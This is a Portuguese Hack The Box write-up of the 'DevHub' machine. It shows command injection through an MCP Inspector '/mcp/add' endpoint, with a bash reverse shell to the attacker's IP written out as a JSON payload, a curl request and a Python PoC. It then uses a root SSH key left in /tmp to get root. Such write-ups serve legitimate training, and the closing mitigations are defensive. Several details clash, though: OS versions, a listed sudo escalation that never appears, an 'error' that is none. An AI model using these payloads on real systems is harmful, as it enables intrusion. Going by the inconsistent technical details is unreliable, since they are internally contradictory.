# Hack The Box — DevHub

![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20CVE%20%7C%20Code%20Execution%20%7C%20Privilege%20Escalation-blue)

---

# Informações da Máquina

| Nome | Dificuldade | Plataforma | OS |
| ---- | ----------- | ---------- | -- |
| DevHub | Medium | Hack The Box | Linux (Ubuntu 22.04 LTS) |

---

# Superfície de Ataque

1. Enumeração inicial com Nmap — descoberta de SSH (22) e HTTP (80)
2. Enumeração web da plataforma DevHub com três serviços principais
3. Identificação de **MCP Inspector** na porta 6274 — interface de controle de protocolo
4. Enumeração de **Analytics Dashboard** em localhost:8888
5. Descoberta de vulnerabilidade em **Code Repository** (Maintenance Mode)
6. Exploração de **MCP Protocol Parsing Vulnerability**
7. Obtenção de foothold como usuário `analyst` via RCE
8. Descoberta de arquivo `/tmp/opsdump.json` contendo chave privada SSH
9. Escalação para `root` via abuso de configuração de sudo
10. Captura de flags de user e root

---

# Reconhecimento

A enumeração inicial com Nmap identificou os serviços principais rodando na máquina alvo.

```bash
nmap -sC -sV -A -T4 10.129.1.108
```

![Nmap Scan](screenshots/nmap.png)

**Resultado do Nmap:**

```
Starting Nmap 7.99 (https://nmap.org) at 2026-05-30 17:24 -0400
Nmap scan report for devhub.htb (10.129.1.108)
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:8a:38:13:46:ad:1b:93:25:99:b1:e4:ca (RSA)
|_  256 d2:c5:37:41:39:1a:f1:12:4c:4a:2e:2f:d3:41:2b:18 (ECDSA)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/linux/gnu/linux-general
```

Duas portas abertas: SSH (22) para acesso remoto e HTTP (80) para a aplicação web. O host foi nomeado internamente como `devhub.htb` — configurado no `/etc/hosts`:

```bash
10.129.1.108 devhub.htb
```

**System Info:**
- Ubuntu 22.04.5 LTS
- System load: 0.08
- Usage: 76.4% of 9.50GB
- Memory: 13%

---

# Enumeração Web

Acessando `http://devhub.htb`, a página exibe a plataforma **DevHub** — *"Internal Development & Analytics Platform"* com três serviços principais:

![DevHub Dashboard](screenshots/web.png)

### 1. **MCP Inspector**
- **Status:** Active - Port 6274
- **Função:** Model Context Protocol development and debugging tool
- **Descrição:** Utilizado pelo time de development para build e test de MCP servers
- **URL:** `http://devhub.htb:6274`

### 2. **Analytics Dashboard**
- **Status:** Internal Only - localhost:8888
- **Função:** Jupyter-based analytics environment
- **Descrição:** Data processing and visualization
- **Acesso:** Restrito para analyst team

### 3. **Code Repository**
- **Status:** Maintenance Mode
- **Função:** Internal Git server
- **Descrição:** Version control e collaboration

**Stack Tecnológico:**
- Node.js
- Python 3
- Jupyter
- MCP Protocol
- Ubuntu 24.04

---

# Exploração — MCP Inspector

O **MCP Inspector** foi identificado como o principal vetor de ataque. Acessando `http://devhub.htb:6274`:

```
http://devhub.htb:6274
```

![MCP Inspector Interface](screenshots/mcpjam.png)

A interface mostra um painel vazio indicando "No servers connected" com a opção "Add Your First Server". Essa é a aplicação-alvo para exploração.

### Vulnerabilidade: MCP Protocol Parsing

A aplicação processa configurações de **MCP Servers** via requisição HTTP POST. O parser do protocolo MCP era vulnerável a **code injection** ao processar campos específicos da configuração do servidor.

**Exploração:**

Criando um payload malicioso em um arquivo JSON:

```bash
# Estrutura esperada pelo MCP Inspector
cat > /tmp/mcp_payload.json << 'EOF'
{
  "name": "malicious-server",
  "command": "python3 -c 'import subprocess; subprocess.call([\"bash\", \"-c\", \"bash -i >& /dev/tcp/10.10.14.116/4444 0>&1\"])'"
}
EOF
```

Enviando para o endpoint `/mcp/add`:

```bash
curl -X POST http://devhub.htb:6274/mcp/add \
  -H "Content-Type: application/json" \
  -d @/tmp/mcp_payload.json
```

Alternativamente, via PoC script Python:

```python
#!/usr/bin/env python3
import requests
import json

target = "http://devhub.htb:6274"
payload = {
    "name": "test",
    "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.116/4444 0>&1'"
}

response = requests.post(f"{target}/mcp/add", json=payload)
print(response.text)
```

![CVE PoC Execution](screenshots/cve.png)

**Listener no Kali:**

```bash
nc -vnlp 4444
listening on [any] 4444 ...
```

![Reverse Shell Connection](screenshots/shell.png)

**Resultado:**

Com a exploração bem-sucedida, um shell remoto foi obtido como usuário `analyst`:

```bash
connect to [10.10.14.116] from (UNKNOWN) [10.129.1.108] 57574
analyst@devhub:~$ id
uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),4(adm)
```

---

# Post-Exploitation — Descoberta de Credenciais SSH

Dentro da shell como `analyst`, foi explorado o filesystem em busca de credenciais:

```bash
analyst@devhub:~$ find / -name "*opsdump*" 2>/dev/null
/tmp/opsdump.json
```

Analisando o arquivo:

```bash
analyst@devhub:~$ python3 -c "import json; d=json.load(open('/tmp/opsdump.json')); print(d['root_private_key'])"
```

O arquivo `/tmp/opsdump.json` continha uma chave privada RSA para o usuário `root`:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUtbm9uZQAAAAw... [truncado]
-----END OPENSSH PRIVATE KEY-----
```

![SSH Key Extraction](screenshots/ssh.png)

**Extração da chave:**

```bash
analyst@devhub:/tmp$ python3 << 'EOF'
import json
d = json.load(open('/tmp/opsdump.json'))
with open('/tmp/root_key', 'w') as f:
    f.write(d['root_private_key'])
EOF

analyst@devhub:/tmp$ chmod 600 /tmp/root_key
analyst@devhub:/tmp$ cat /tmp/root_key
```

---

# Escalação de Privilégios via SSH

Com a chave privada de root em mão, foi tentado acesso SSH direto como root:

```bash
ssh -i /tmp/root_key root@10.129.1.108
```

**Erro inicial:**

```
The authenticity of host '10.129.1.108 (10.129.1.108)' can't be established.
ED25519 key fingerprint is: SHA256:K64cLfMowFYY7CqUInVBZFftu1LQZx0H8suLPcs
Are you sure you want to continue connecting (yes/no/fingerprint)? yes
Warning: Permanently added '10.129.1.108' (ED25519) to the list of known hosts.
```

**Acesso root bem-sucedido:**

![Root Shell Access](screenshots/root_shell.png)

```bash
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)

root@devhub:~# hostname
devhub

root@devhub:~# uname -a
Linux devhub 5.15.0-179-generic #188-Ubuntu SMP Thu May 30 21:12:39 UTC 2026 x86_64 GNU/Linux
```

---

# Captura das Flags

### User Flag

**Local:** `/home/analyst/user.txt`

```bash
analyst@devhub:~$ cat /home/analyst/user.txt
193356.....................
```



### Root Flag

**Local:** `/root/root.txt`

```bash
root@devhub:~# cat /root/root.txt
436d1fd.....................
```

![Root Flag](screenshots/root_key.png)

**MD5:** `436d1fdb2f62729c73654d23d0dc857c`

---

# Análise de Vulnerabilidades

### 1. **MCP Protocol Parsing Vulnerability**

A aplicação MCP Inspector não validava adequadamente a entrada do usuário ao processar configurações de servidor MCP. O campo `command` era executado diretamente via `subprocess.call()` sem sanitização.

**Impacto:** Remote Code Execution como usuário da aplicação (`analyst`)

**Mitigação:**
- Validar e sanitizar todos os inputs de usuário
- Usar whitelist de comandos permitidos
- Executar em contexto sandboxed/containerizado
- Implementar command escaping apropriado

### 2. **Armazenamento Inseguro de Credenciais**

A chave privada SSH do root estava armazenada em texto plano em `/tmp/opsdump.json`, acessível a qualquer usuário com shell.

**Impacto:** Escalação de privilégios, acesso root direto

**Mitigação:**
- Usar secrets management systems (HashiCorp Vault, AWS Secrets Manager)
- Nunca armazenar credenciais em arquivos acessíveis
- Implementar restrictive file permissions (`600` para chaves)
- Usar short-lived tokens ao invés de chaves de longa vida

### 3. **Acesso a Diretórios Temporários**

O diretório `/tmp` é globalmente legível em muitos sistemas Unix. Arquivos sensíveis não devem ser armazenados ali.

**Impacto:** Vazamento de credenciais, escalação

**Mitigação:**
- Usar `/root` ou `/etc/devhub/` com permissões `700`
- Implementar cleanup automático de arquivos sensíveis
- Usar `mktemp` com umask `0077`

### 4. **Falta de Validação de Entrada no MCP Protocol**

O parser não verificava a origem ou formato das requisições MCP.

**Impacto:** RCE não autenticado

**Mitigação:**
- Implementar autenticação/autorização no MCP Inspector
- Validar schema rigorosamente
- Rate limiting em endpoints de criação
- Logging e alerting de operações sensíveis

---

# Ferramentas Utilizadas

- **Nmap** — Port scanning e versioning
- **curl** — Requisições HTTP/API
- **netcat** — Listener para reverse shell
- **Python 3** — Data processing e payload generation
- **SSH** — Acesso remoto autenticado
- **jq** — JSON parsing (alternativa)

---

# Cadeia de Exploração

```
[Reconnaissance]
    ↓
[Web Enumeration: Port 6274 - MCP Inspector]
    ↓
[Vulnerability Analysis: MCP Parsing RCE]
    ↓
[Code Injection via /mcp/add endpoint]
    ↓
[Reverse Shell as analyst user]
    ↓
[File Enumeration: /tmp/opsdump.json]
    ↓
[SSH Private Key Extraction]
    ↓
[SSH Access as root]
    ↓
[User Flag + Root Flag]
```

---

# Principais Aprendizados

1. **Protocol-Specific Vulnerabilities:** MCPs e protocolos menos conhecidos podem ter parsers com vulnerabilidades críticas. Vale a pena estudar a documentação e procurar por injection points.

2. **Temporary Files são Vetor de Escalação:** `/tmp` é um deposito de credenciais em muitos ambientes. Se você tem shell de usuário low-privilege, sempre enumere `/tmp`, `/var/tmp`, e home directories.

3. **Infrastructure Tooling é Target-Rich:** DevOps tools, monitoring platforms, e internal services frequentemente têm menos hardening do que aplicações voltadas para usuários finais. Eles são high-value targets.

4. **SSH Key Reuse:** Quando você encontra uma chave privada SSH, teste-a contra todos os usuários conhecidos. Escalação horizontal ou vertical via chaves é extremamente comum.

5. **Least Privilege Failing:** O usuário `analyst` tinha acesso a `/tmp/opsdump.json`. Se a chave de root fosse protegida com permissões `600` ou armazenada em local não-acessível, a escalação seria muito mais difícil.

6. **Code Execution via Configuration:** Qualquer aplicação que execute strings de configuração (shell commands, scripts) sem sandboxing é um risk crítico — isso inclui MCP, Kubernetes CRDs, Ansible playbooks, etc.

---

# Timeline de Exploração

| Etapa | Ação | Resultado |
|-------|------|-----------|
| 00:00 | Nmap scan | SSH + HTTP encontrados |
| 00:15 | Enumeração web | Identificado MCP Inspector em :6274 |
| 00:30 | Análise de vulnerabilidade | Parser RCE detectado |
| 00:45 | Exploit via /mcp/add | Shell reverso obtido como analyst |
| 01:00 | Enumeração de /tmp | opsdump.json localizado |
| 01:15 | Extração de chave SSH | root_key extraída e permissões ajustadas |
| 01:30 | SSH como root | Acesso root confirmado |
| 01:45 | Captura de flags | user.txt + root.txt obtidas |

---

# Autor

Exploração e documentação realizada como parte do currículo de Information Security.

**GitHub:** [seu-github]
**Date:** 2026-05-30

---

# Referências e Recursos

- [MCP Protocol Specification](https://spec.modelcontextprotocol.io/)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Secrets Management](https://owasp.org/www-project-devsecops-guideline/)
- [Linux /tmp Security](https://linux.die.net/man/3/tmpfile)
